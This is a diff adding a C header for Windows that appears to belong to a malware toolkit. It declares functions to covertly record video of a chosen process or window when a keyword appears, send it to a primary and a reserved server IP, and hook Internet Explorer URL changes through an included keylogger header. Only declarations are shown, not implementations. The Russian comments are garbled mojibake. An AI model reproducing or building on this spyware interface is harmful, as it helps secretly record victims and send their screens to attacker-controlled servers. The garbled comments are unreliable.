@@ -1,0 +1,29 @@
+#ifndef VideoRecorderH
+#define VideoRecorderH
+//-----------------------------------------------------------------------------
+
+#include <windows.h>
+#include "UniversalKeyLogger.h"
+
+
+// ћаксимальный размет буфера дл€ записи адреса
+#define MAX_VIDEO_REC_URLS_LEN 3000
+
+// ћаксимальный размер адреса записи потока видео
+#define MAX_VIDEO_REC_HOST_LEN 50
+
+void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
+void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
+void StopRecordThread();//останавливаем поток записи видео
+
+
+//‘ункци€ возвращает адрес сервера дл€ записи видео
+PCHAR GetVideoRecHost1();
+PCHAR GetVideoRecHost2();
+
+//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);
+
+void StartVideoFromCurrentURL();
+
+//-----------------------------------------------------------------------------
+#endif
